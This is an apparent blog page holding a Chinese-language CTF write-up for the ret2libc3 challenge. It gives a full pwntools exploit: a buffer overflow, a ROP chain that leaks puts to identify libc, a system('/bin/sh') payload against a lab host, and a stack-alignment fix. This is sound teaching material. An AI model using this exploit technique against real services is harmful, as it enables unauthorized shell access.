@@ -1,0 +1,460 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>ret2libc3_new | CAI dog</title>
+<meta name="keywords" content="">
+<meta name="description" content="首先查看基本信息：
+v1 大小为 0x70，ret 大小为 8，故 padding 为 0x78
+然后查看/bin/sh 和 system：
+并没有/bin/sh 和 system。
+搜索 syscall 也没有找到
+这种情况下我们只能选择泄露函数地址，查找 libc.so 版本来调用函数了。
+通过 IDA 查看伪代码，我们可以看到程序调用 puts 函数和 setbuf 函数，于是我们选择泄露 这俩函数的地址来查找 libc 的版本：
+from pwn import *context.log_level = &#39;debug&#39;p = remote(&#39;10.0.25.109&#39;,10007)#p = process(&#39;./ret2libc3&#39;)if args.G:gdb.attach(p)pause()elf = ELF(&#39;./ret2libc3&#39;)main = 0x4006AEpop_rdi_ret = 0x400743puts_addr = 0x400695pop_rsi_r15_ret = 0x400741payload = b&#39;a&#39;*120&#43;p64(pop_rdi_ret) &#43; p64(elf.got[&#39;puts&#39;]) payload &#43;= p64(elf.">
+<meta name="author" content="shangdi4sb">
+<link rel="canonical" href="https://jellyfish-pro.github.io/ctf/ret2libc3_new/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css" integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe&#43;FVUFzPh7U=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://jellyfish-pro.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://jellyfish-pro.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://jellyfish-pro.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://jellyfish-pro.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://jellyfish-pro.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="ret2libc3_new" />
+<meta property="og:description" content="首先查看基本信息：
+v1 大小为 0x70，ret 大小为 8，故 padding 为 0x78
+然后查看/bin/sh 和 system：
+并没有/bin/sh 和 system。
+搜索 syscall 也没有找到
+这种情况下我们只能选择泄露函数地址，查找 libc.so 版本来调用函数了。
+通过 IDA 查看伪代码，我们可以看到程序调用 puts 函数和 setbuf 函数，于是我们选择泄露 这俩函数的地址来查找 libc 的版本：
+from pwn import *context.log_level = &#39;debug&#39;p = remote(&#39;10.0.25.109&#39;,10007)#p = process(&#39;./ret2libc3&#39;)if args.G:gdb.attach(p)pause()elf = ELF(&#39;./ret2libc3&#39;)main = 0x4006AEpop_rdi_ret = 0x400743puts_addr = 0x400695pop_rsi_r15_ret = 0x400741payload = b&#39;a&#39;*120&#43;p64(pop_rdi_ret) &#43; p64(elf.got[&#39;puts&#39;]) payload &#43;= p64(elf." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://jellyfish-pro.github.io/ctf/ret2libc3_new/" /><meta property="article:section" content="ctf" />
+
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="ret2libc3_new"/>
+<meta name="twitter:description" content="首先查看基本信息：
+v1 大小为 0x70，ret 大小为 8，故 padding 为 0x78
+然后查看/bin/sh 和 system：
+并没有/bin/sh 和 system。
+搜索 syscall 也没有找到
+这种情况下我们只能选择泄露函数地址，查找 libc.so 版本来调用函数了。
+通过 IDA 查看伪代码，我们可以看到程序调用 puts 函数和 setbuf 函数，于是我们选择泄露 这俩函数的地址来查找 libc 的版本：
+from pwn import *context.log_level = &#39;debug&#39;p = remote(&#39;10.0.25.109&#39;,10007)#p = process(&#39;./ret2libc3&#39;)if args.G:gdb.attach(p)pause()elf = ELF(&#39;./ret2libc3&#39;)main = 0x4006AEpop_rdi_ret = 0x400743puts_addr = 0x400695pop_rsi_r15_ret = 0x400741payload = b&#39;a&#39;*120&#43;p64(pop_rdi_ret) &#43; p64(elf.got[&#39;puts&#39;]) payload &#43;= p64(elf."/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "ctf",
+      "item": "https://jellyfish-pro.github.io/ctf/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "ret2libc3_new",
+      "item": "https://jellyfish-pro.github.io/ctf/ret2libc3_new/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "ret2libc3_new",
+  "name": "ret2libc3_new",
+  "description": "首先查看基本信息：\nv1 大小为 0x70，ret 大小为 8，故 padding 为 0x78\n然后查看/bin/sh 和 system：\n并没有/bin/sh 和 system。\n搜索 syscall 也没有找到\n这种情况下我们只能选择泄露函数地址，查找 libc.so 版本来调用函数了。\n通过 IDA 查看伪代码，我们可以看到程序调用 puts 函数和 setbuf 函数，于是我们选择泄露 这俩函数的地址来查找 libc 的版本：\nfrom pwn import *\rcontext.log_level = \u0026#39;debug\u0026#39;\rp = remote(\u0026#39;10.0.25.109\u0026#39;,10007)\r#p = process(\u0026#39;./ret2libc3\u0026#39;)\rif args.G:\rgdb.attach(p)\rpause()\relf = ELF(\u0026#39;./ret2libc3\u0026#39;)\rmain = 0x4006AE\rpop_rdi_ret = 0x400743\rputs_addr = 0x400695\rpop_rsi_r15_ret = 0x400741\rpayload = b\u0026#39;a\u0026#39;*120+p64(pop_rdi_ret) + p64(elf.got[\u0026#39;puts\u0026#39;]) payload += p64(elf.",
+  "keywords": [
+    
+  ],
+  "articleBody": "首先查看基本信息：\nv1 大小为 0x70，ret 大小为 8，故 padding 为 0x78\n然后查看/bin/sh 和 system：\n并没有/bin/sh 和 system。\n搜索 syscall 也没有找到\n这种情况下我们只能选择泄露函数地址，查找 libc.so 版本来调用函数了。\n通过 IDA 查看伪代码，我们可以看到程序调用 puts 函数和 setbuf 函数，于是我们选择泄露 这俩函数的地址来查找 libc 的版本：\nfrom pwn import *\rcontext.log_level = 'debug'\rp = remote('10.0.25.109',10007)\r#p = process('./ret2libc3')\rif args.G:\rgdb.attach(p)\rpause()\relf = ELF('./ret2libc3')\rmain = 0x4006AE\rpop_rdi_ret = 0x400743\rputs_addr = 0x400695\rpop_rsi_r15_ret = 0x400741\rpayload = b'a'*120+p64(pop_rdi_ret) + p64(elf.got['puts']) payload += p64(elf.plt['puts']) + p64(main)\rdemo = 'in: \\n'\rp.sendlineafter(demo,payload)\rputs = u64(p.recv(6).ljust(8,b'\\x00'))\rprint('puts',hex(puts)) 得到地址后我们通过新的工具：https://github.com/niklasb/libc-database\n之前的 libcsearcher 是 python2 时代的工具，在从 python2 向 python3 转型的过程中，缺少 了更新，所以有时查找道德 libc 版本可能不准确。\n新的工具提供了一个在线使用的网站：https://libc.rip/\n除此之外也可 clone 到本地，通过指令进行使用：\n这里我们通过网站进行查询：\n查找到了两个结果：\n这两个结果只有 str_bin_sh 的偏移大小有区别，因此我们只有挨个尝试或者选择泄露其他地 址 不 一 样 的 函 数 ， 在 经 过 最 后 的 筛 选 ， 发 现 是 libc 的 版 本 号 为 [libc6_2.23-0ubuntu11.3_amd64]：\n因此我们的 payload 为：\nlibcbase = puts-0x6f6a0\rsystem = libcbase + 0x453a0\rbin_sh = libcbase + 0x18ce57\rprint('system',hex(system))\rprint('binsh',hex(bin_sh))\rpayload2 = b'a'*120 + p64(pop_rdi_ret) + p64(bin_sh) + p64(system)\rp.sendline(payload2)\rp.interactive() 补充\n当本题目需要进入远程靶场时，务必以靶场所使用的 libc 版本为准。仅仅是在本地打通获得 本地 shell 并不能保证一定会取得远程 shell。\n除此之外，因为不同的 libc 对函数的处理也不一样，可能会遇到需要内存对齐的问题，例如 本题，使用同样的 payload，攻击远程则可以获得 shell，但在本地则不可以：\n通过 gdb.attach 则可以看到程序卡在了 movaps 指令处\n这是因为 movaps 指令在 64 位下会涉及到内存对齐 16-byte 的问题\n在 gdb 中直观的来看，就是运行到这里时，rsp 指向的内存地址的最后一位必须是 0。\n那么解决方法就是我们修改 payload，使得 rsp 对齐。\npayload2 = b'a'*120 payload2 += p64(pop_rsi_r15_ret) //八位地址，内存最后一位变为 0\rpayload2 += p64(bin_sh) //八位地址，内存最后一位变为 8\rpayload2 += p64(bin_sh) //八位地址，内存最后一位变为 0\rpayload2 += p64(pop_rdi_ret) + p64(bin_sh) + p64(system) //原本的 payload 这样就使得运行到这里时，内存对齐了\n",
+  "wordCount" : "223",
+  "inLanguage": "en",
+  "datePublished": "0001-01-01T00:00:00Z",
+  "dateModified": "0001-01-01T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "shangdi4sb"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://jellyfish-pro.github.io/ctf/ret2libc3_new/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "CAI dog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://jellyfish-pro.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://jellyfish-pro.github.io" accesskey="h" title="CAI dog (Alt + H)">CAI dog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://jellyfish-pro.github.io/search" title="search (Alt &#43; /)" accesskey=/>
+                    <span>search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/" title="home">
+                    <span>home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/posts" title="posts">
+                    <span>posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/note" title="note">
+                    <span>note</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/ctf" title="ctf">
+                    <span>ctf</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://jellyfish-pro.github.io">Home</a>&nbsp;»&nbsp;<a href="https://jellyfish-pro.github.io/ctf/">ctf</a></div>
+    <h1 class="post-title">
+      ret2libc3_new
+    </h1>
+    <div class="post-meta">2 min&nbsp;·&nbsp;shangdi4sb
+
+</div>
+  </header> 
+
+  <div class="post-content"><p>首先查看基本信息：</p>
+<p><img loading="lazy" src="/ctf/ret2libc3.img/image-20220402155811124.png" alt="image-20220402155811124"  />
+</p>
+<p><img loading="lazy" src="/ctf/ret2libc3.img/image-20220402155822105.png" alt="image-20220402155822105"  />
+</p>
+<p>v1 大小为 0x70，ret 大小为 8，故 padding 为 0x78</p>
+<p>然后查看/bin/sh 和 system：</p>
+<p><img loading="lazy" src="/ctf/ret2libc3.img/image-20220402155847094.png" alt="image-20220402155847094"  />
+</p>
+<p>并没有/bin/sh 和 system。</p>
+<p>搜索 syscall 也没有找到</p>
+<p><img loading="lazy" src="/ctf/ret2libc3.img/image-20220402155910370.png" alt="image-20220402155910370"  />
+</p>
+<p>这种情况下我们只能选择泄露函数地址，查找 libc.so 版本来调用函数了。</p>
+<p>通过 IDA 查看伪代码，我们可以看到程序调用 puts 函数和 setbuf 函数，于是我们选择泄露 这俩函数的地址来查找 libc 的版本：</p>
+<pre tabindex="0"><code>from pwn import *
+
+context.log_level = &#39;debug&#39;
+
+p = remote(&#39;10.0.25.109&#39;,10007)
+#p = process(&#39;./ret2libc3&#39;)
+
+if args.G:
+	gdb.attach(p)
+
+pause()
+
+elf = ELF(&#39;./ret2libc3&#39;)
+main = 0x4006AE
+pop_rdi_ret = 0x400743
+puts_addr = 0x400695
+pop_rsi_r15_ret = 0x400741
+
+payload = b&#39;a&#39;*120+p64(pop_rdi_ret) + p64(elf.got[&#39;puts&#39;]) 
+payload += p64(elf.plt[&#39;puts&#39;]) + p64(main)
+
+demo = &#39;in: \n&#39;
+p.sendlineafter(demo,payload)
+puts = u64(p.recv(6).ljust(8,b&#39;\x00&#39;))
+print(&#39;puts&#39;,hex(puts))
+</code></pre><p><img loading="lazy" src="/ctf/ret2libc3.img/image-20220402160019371.png" alt="image-20220402160019371"  />
+</p>
+<p><img loading="lazy" src="/ctf/ret2libc3.img/image-20220402160030775.png" alt="image-20220402160030775"  />
+</p>
+<p>得到地址后我们通过新的工具：https://github.com/niklasb/libc-database</p>
+<p>之前的 libcsearcher 是 python2 时代的工具，在从 python2 向 python3 转型的过程中，缺少 了更新，所以有时查找道德 libc 版本可能不准确。</p>
+<p>新的工具提供了一个在线使用的网站：https://libc.rip/</p>
+<p><img loading="lazy" src="/ctf/ret2libc3.img/image-20220402160124486.png" alt="image-20220402160124486"  />
+</p>
+<p>除此之外也可 clone 到本地，通过指令进行使用：</p>
+<p><img loading="lazy" src="/ctf/ret2libc3.img/image-20220402160138792.png" alt="image-20220402160138792"  />
+</p>
+<p>这里我们通过网站进行查询：</p>
+<p><img loading="lazy" src="/ctf/ret2libc3.img/image-20220402160423550.png" alt="image-20220402160423550"  />
+</p>
+<p>查找到了两个结果：</p>
+<p><img loading="lazy" src="/ctf/ret2libc3.img/image-20220402160448035.png" alt="image-20220402160448035"  />
+</p>
+<p>这两个结果只有 str_bin_sh 的偏移大小有区别，因此我们只有挨个尝试或者选择泄露其他地 址 不 一 样 的 函 数 ， 在 经 过 最 后 的 筛 选 ， 发 现 是 libc 的 版 本 号 为 [libc6_2.23-0ubuntu11.3_amd64]：</p>
+<p>因此我们的 payload 为：</p>
+<pre tabindex="0"><code>libcbase = puts-0x6f6a0
+system = libcbase + 0x453a0
+bin_sh = libcbase + 0x18ce57
+print(&#39;system&#39;,hex(system))
+print(&#39;binsh&#39;,hex(bin_sh))
+payload2 = b&#39;a&#39;*120 + p64(pop_rdi_ret) + p64(bin_sh) + p64(system)
+p.sendline(payload2)
+p.interactive()
+</code></pre><p><img loading="lazy" src="/ctf/ret2libc3.img/image-20220402160521253.png" alt="image-20220402160521253"  />
+</p>
+<p><strong>补充</strong></p>
+<p>当本题目需要进入远程靶场时，务必以靶场所使用的 libc 版本为准。仅仅是在本地打通获得 本地 shell 并不能保证一定会取得远程 shell。</p>
+<p>除此之外，因为不同的 libc 对函数的处理也不一样，可能会遇到需要内存对齐的问题，例如 本题，使用同样的 payload，攻击远程则可以获得 shell，但在本地则不可以：</p>
+<p><img loading="lazy" src="/ctf/ret2libc3.img/image-20220402160555775.png" alt="image-20220402160555775"  />
+</p>
+<p><img loading="lazy" src="/ctf/ret2libc3.img/image-20220402160606913.png" alt="image-20220402160606913"  />
+</p>
+<p>通过 gdb.attach 则可以看到程序卡在了 movaps 指令处</p>
+<p>这是因为 movaps 指令在 64 位下会涉及到内存对齐 16-byte 的问题</p>
+<p><img loading="lazy" src="/ctf/ret2libc3.img/image-20220402160621245.png" alt="image-20220402160621245"  />
+</p>
+<p>在 gdb 中直观的来看，就是运行到这里时，rsp 指向的内存地址的最后一位必须是 0。</p>
+<p>那么解决方法就是我们修改 payload，使得 rsp 对齐。</p>
+<pre tabindex="0"><code>payload2 = b&#39;a&#39;*120 
+payload2 += p64(pop_rsi_r15_ret) //八位地址，内存最后一位变为 0
+payload2 += p64(bin_sh) //八位地址，内存最后一位变为 8
+payload2 += p64(bin_sh) //八位地址，内存最后一位变为 0
+payload2 += p64(pop_rdi_ret) + p64(bin_sh) + p64(system) //原本的 payload
+</code></pre><p>这样就使得运行到这里时，内存对齐了</p>
+<p><img loading="lazy" src="/ctf/ret2libc3.img/image-20220402160651523.png" alt="image-20220402160651523"  />
+</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://jellyfish-pro.github.io/ctf/ret2libc2_old/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>ret2libc2_old</span>
+  </a>
+  <a class="next" href="https://jellyfish-pro.github.io/ctf/ret2libc3_old/">
+    <span class="title">Next »</span>
+    <br>
+    <span>ret2libc3_old</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2023 <a href="https://jellyfish-pro.github.io">CAI dog</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
